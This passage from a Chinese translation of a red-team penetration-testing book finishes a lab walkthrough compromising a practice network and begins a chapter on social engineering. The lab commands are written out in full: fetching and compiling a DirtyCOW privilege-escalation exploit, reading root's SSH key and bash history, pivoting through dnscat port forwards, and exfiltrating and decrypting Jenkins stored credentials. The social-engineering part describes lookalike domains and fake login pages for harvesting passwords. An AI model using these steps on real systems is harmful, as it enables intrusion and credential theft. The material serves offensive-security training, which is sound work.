版本。幸运的是，此服务器容易受到权限提升漏洞 DirtyCOW
的攻击。让我们创建一个 DirtyCOW 二进制文件并转到根目录！
Escalation 提升 dnscat 权限：
-   下载并编译目录：
    -   cd /tmp
    -   wget [http://bit.ly/2vdh2Ub](http://bit.ly/2vdh2Ub){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"} -O
        dirtycow-mem.c
    -   gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
    -   ./dirtycow-mem
-   尝试保持 DirtyCOW 漏洞利用的稳定性，并允许内核崩溃时重新启动。
    -   echo 0 \> /proc/sys/vm/dirty_writeback_centisecs
    -   echo 1 \> /proc/sys/kernel/panic && echo 1 \>
        /proc/sys/kernel/panic_on_oops && echo 1 \>
        /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 \>
        /proc/sys/kernel/panic_on_io_nmi && echo 1 \>
        /proc/sys/kernel/panic_on_warn
-   whoami
![](4-56.png){.calibre11}
注意：DirtyCOW
不是一个非常稳定的提权方法。如果你对漏洞利用过程有问题，请查看我的
Github 页面，在这里了解创建 setuid 二进制文件的更稳定的过程：
-   [https://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab](https://raw.githubusercontent.com/cheetz/dirtycow/master/THP-Lab){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   如果仍然有问题，另一个选项是通过 SSH 登录到初始服务器，并以 root
    身份执行 dnscat payload。要登录，请使用凭据 hacker/changeme
    登录系统并使用 sudo-su 获得 root 权限。
现在，由于主机系统上没有补丁，你已经成为系统的 root
用户。当你再次开始为敏感信息翻阅系统文件时，你会看到 root 的 bash
历史文件。在这个文件中，你可以找到 SSH 命令和私有 SSH
密钥来源。我们可以使用此 SSH 密钥并登录到第二个系统172.16.250.30：
-   cat \~/.bash_history
-   head \~/.ssh/id_rsa
-   ssh -i \~/.ssh/id_rsa PI:EMAIL
![](4-57.png){.calibre11}
你花了一些时间在第二个系统上，试着理解它的用途。在四处搜索时，你注意到在
/home 目录中有一个 Jenkins 用户，它引导你识别在端口8080上运行的 Jenkins
服务。我们如何使用浏览器查看 Jenkins 服务器上的内容？这就是 dnscat
的端口转发功能发挥作用的地方。我们需要退出最初的shell，去命令终端。从那里，我们需要设置一个监听器，通过
dnscat 将我们的流量从攻击者机器转发到端口8080上的 Jenkins
Box（172.16.250.30)。
执行 dnscat 端口转发：
-   退出现有的 shell
    -   Ctrl + z
-   返回我们的第一个命令代理并设置一个监听器/端口转发：
    -   window -i 1
    -   listen 127.0.0.1:8080 172.16.250.30:8080
-   在你的 Kali
    虚拟机上，使用我们的端口转发代理打开浏览器并打开下面的地址（这将比
    dns 慢一些）：
    -   [http://127.0.0.1:8080/jenkins](http://127.0.0.1:8080/jenkins){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"}
![](4-58.png){.calibre11}
在 Jenkins 应用程序内的凭证管理器内部，我们将看到 db_backup
用户密码已存储，但不可见。 我们需要弄清楚如何从 Jenkins
中获取此凭据，以便我们可以继续横向移动。
![](4-59.png){.calibre11}
n00py 对 Jenkins 中存储的凭据以及如何提取它们做了一些很好的研究（
[http://bit.ly/2GUIN9s](http://bit.ly/2GUIN9s){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"} ）。 我们可以使用现有的 shell
来利用此攻击并获取 credentials.xml，master.key 和 hudson.util.Secret
文件。
-   返回 dnscat 中的主菜单并与原始 shell 进行交互
    -   Ctrl + z
    -   window -i 2
-   转到 Jenkins 的主目录并获取三个文件：credentials.xml，master.key 和
    hudson.util.Secret。
    -   cd /home/Jenkins
-   我们可以尝试关闭这些文件，或者我们可以将这些文件作为基础并通过当前的
    shell 复制它们。
    -   base64 credentials.xml
    -   base64 secrets/hudson.util.Secret
    -   base64 secrets/master.key
-   我们可以将 base64输出复制回我们的 Kali 系统并解码它们以破解
    db_backup 用户的密码。
    -   cd /opt/jenkins-decrypt
    -   echo "``{=html}" \|
        base64 ---decode \> hudson.util.Secret``{=html}
    -   echo "``{=html}" \| base64
        ---decode \> master.key``{=html}
    -   echo "``{=html}" \|
        base64 ---decode \> credentials.xml``{=html}
-   使用
    [https://github.com/cheetz/jenkins-decrypt](https://github.com/cheetz/jenkins-decrypt){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"} 解密密码
    -   python3 ./decrypt.py master.key hudson.util.Secret
        credentials.xml
![](4-60.png){.calibre11}
我们能够成功解密 db_backup 用户的密码 `)uDvra{4UL^;r？*h`{.calibre14
.pcalibre4 .pcalibre3}。如果我们回顾一下之前的注释，我们会在 OpenCMS
属性文件中看到数据库服务器位于 172.16.250.50。看起来这个 Jenkins
服务器出于某种原因会对数据库服务器执行某种备份。让我们检查一下我们是否可以获取
db_backup 的凭据：利用 `)uDvra{4UL^;r？*h`{.calibre14 .pcalibre4
.pcalibre3} 通过 SSH 登录数据库服务器。唯一的问题是通过我们的 dnscat
shell，我们没有直接按标准输入（STDIN）来与 SSH 的密码提示进行交互。
因此，我们将不得不再次使用我们的端口将我们的 SSH shell 从 Kali
虚拟机通过 dnscat 代理传递到数据库服务器（172.16.250.50）。
-   回到命令 shell
    -   Ctrl + z
    -   window -i 1
-   创建一个新的端口转发，从 localhost 转到172.16.250.50的数据库服务器
    -   listen 127.0.0.1:2222 172.16.250.50:22
![](4-61.png){.calibre11}
一旦使用 db_backup
帐户进入数据库服务器（172.16.250.50），我们会注意到此帐户是 sudoers
文件的一部分，并且可以 sudo su 到 root。 一旦 root
在数据库服务器上，我们将四处寻找也找不到任何访问数据库的凭据。我们可以重置
root
数据库密码，但最终可能会破坏其他一些应用程序。相反，我们搜索位于/var/lib/mysql
下的不同数据库，并发现 cyberspacekittens 数据库。在这里，我们找到
secrets.ibd 文件，其中包含 secrets
表的所有数据。在我们阅读数据时，我们意识到它可能是加密的\...由你来执行剩下的操作\...
![](4-62.png){.calibre11}
恭喜！！！你已成功入侵 Cyber Space Kittens 网络！
不要止步于此\...你可以用这些系统做很多事情；我们现在只触及了表面。随意在被入侵的系统上翻阅，找到更敏感的文件，找出其他权限升级的方法，等等。作为参考，在本实验中，环境拓扑如下所示：
![](4-63.png){.calibre11}
## 本章总结 {#4_the_drive_compromising_the_network.html#本章总结 .calibre12}
在本章中，我们经历了入侵网络的一系列操作。
我们开始在外部网络上没有任何凭据或利用社会工程的方式入侵到我们的第一个受害者系统。从那里开始，我们能够利用目标系统本身的应用程序，获取有关网络和主机系统的信息，横向移动，权限提升，并最终攻陷整个网络。这一切都是建立在最少程度的扫描，利用网络特性，并试图逃避所有检测机制之上完成的。
:::
:::
[]{#5_the_screen_social_engineering.html}
::: page
# 第5章 助攻------社会工程学攻击 {#5_the_screen_social_engineering.html#calibre_toc_8 .book-chapter}
::: section
# 第5章 助攻------社会工程学攻击 {#5_the_screen_social_engineering.html#第5章-助攻——社会工程学攻击 .calibre6}
> 译者：[\@Snowming](https://github.com/Snowming04){.pcalibre2 .calibre9
> .pcalibre .pcalibre1 target="_blank"}
![](5-1.png){.calibre11}
## 开始社会工程学攻击行动 {#5_the_screen_social_engineering.html#开始社会工程学攻击行动 .calibre12}
作为红队队员，我们钟爱社会工程学攻击。不仅因为它通常包含低技能攻击，而且因为它也很容易以非常低的成本来策划一场值得我们高度信赖的战役。只需设置几个假域名、服务器、策划一些电子邮件、假装丢掉一些
bad USB，然后就可以结束一天的工作了。
> 译者注: 这里提到的低技能攻击， 原文是 low skillset
> attacks，我的理解是无需太多技能的攻击，比如踩点、垃圾收集\...\...
在衡量的指标方面，我们一般用捕捉到的明显的信息，例如发送的电子邮件数量、点击了钓鱼链接的用户数量以及键入密码的用户数量。我们也试图发挥创意，为雇用我们的公司带来实质性价值。这方面的一个例子是
DefCon
会议举办的的社会工程学竞赛，在这个竞赛中参赛选手要通过社工的方式来入侵公司和雇员。如果你不熟悉这个竞赛的话，那我简略地介绍一下：参赛选手们需要在有限的时间内针对目标公司找到一些
flag。通过获取公司信息，如他们的 VPN
、他们使用的杀毒软件类型、员工的特定信息或让员工访问钓鱼 URL
等方法，可以捕获 flag。如果你想查看比赛中的使用的所有
flag，请查看2017年的比赛报告：[http://bit.ly/2HlctvY](http://bit.ly/2HlctvY){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} 。
这些类型的攻击可以通过教导员工学会发现恶意行动并向相关负责团队报告从而帮助公司提高内部安全意识。
在本章中，我们将粗浅的接触一些用来进行社会工程学攻击的工具和技术。对于社会工程学攻击，没有正确或错误的答案。只要能发挥作用，在我们的书里就是好的。
### 近似域名（Doppelganger Domain） {#5_the_screen_social_engineering.html#近似域名（doppelganger-domain） .calibre15}
在上本书中我们讲了很多关于近似域名的内容。如今近似域名仍然是获取初始凭证或者植入恶意软件的最成功方法之一。最常用的技术是购买一个与目标公司的URL非常相似的域名，或者是目标公司
URL 的一个常见拼写错误的域名。
在上一本书中，我们举了一个例子，如果我们的目标公司有
mail.cyberspacekittens.com 这个域名，我们将购买
mailcyberspacekittens.com 这个域名，并设置一个假的 Outlook
页面来获取登录凭证。当受害者进入假网站并输入密码时，我们会收集这些数据并将其重定向到公司的有效电子邮件服务器（mail.cyberspacekittens.com）。这给受害者留下这样的印象：他们只是第一次意外地输错了密码，因此，再次输入正确密码并登录他们的帐户。
这种方法最巧妙地一点是你甚至不用做任何网络钓鱼的操作。因为有些人就是会打错域名或者手误漏掉
"mail" 和 "cyberspacekittens"
之间的点（.），然后进入了错误的网页并输入他们的登录凭证。我们会提示让受害者把我们的恶意网站添加为书签，这样可以让受害者每天都访问我们的恶意网页。
### 如何克隆验证页面 {#5_the_screen_social_engineering.html#如何克隆验证页面 .calibre15}